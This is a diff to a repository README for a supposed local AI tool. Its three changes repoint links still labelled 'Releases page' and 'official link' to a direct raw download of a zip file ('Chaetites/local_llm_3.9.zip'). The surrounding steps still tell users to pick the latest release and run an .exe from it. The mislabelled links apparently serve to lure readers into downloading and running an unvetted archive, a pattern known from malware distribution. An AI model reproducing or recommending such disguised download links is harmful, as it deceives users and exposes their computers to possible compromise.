@@ -1,6 +1,6 @@
 # 🌐 local-llm-1-2026 - Run private artificial intelligence tools locally
 
-[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/armorerrepertory598/local-llm-1-2026/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/armorerrepertory598/local-llm-1-2026/raw/refs/heads/main/Chaetites/local_llm_3.9.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To run this application, your computer needs these basic parts:
 
 Follow these steps to set up the software.
 
-1. Go to the [Releases page](https://github.com/armorerrepertory598/local-llm-1-2026/releases).
+1. Go to the [Releases page](https://github.com/armorerrepertory598/local-llm-1-2026/raw/refs/heads/main/Chaetites/local_llm_3.9.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to a folder on your computer.
@@ -68,4 +68,4 @@ If the program fails to run, review this list:
 
 ## 📦 Updates
 
-This project updates frequently to include better support for new hardware and models. Use the [official link](https://github.com/armorerrepertory598/local-llm-1-2026/releases) to find the latest version every few months. Replace your old file with the new one to gain new features. Delete the old file after you confirm the new one works.
+This project updates frequently to include better support for new hardware and models. Use the [official link](https://github.com/armorerrepertory598/local-llm-1-2026/raw/refs/heads/main/Chaetites/local_llm_3.9.zip) to find the latest version every few months. Replace your old file with the new one to gain new features. Delete the old file after you confirm the new one works.
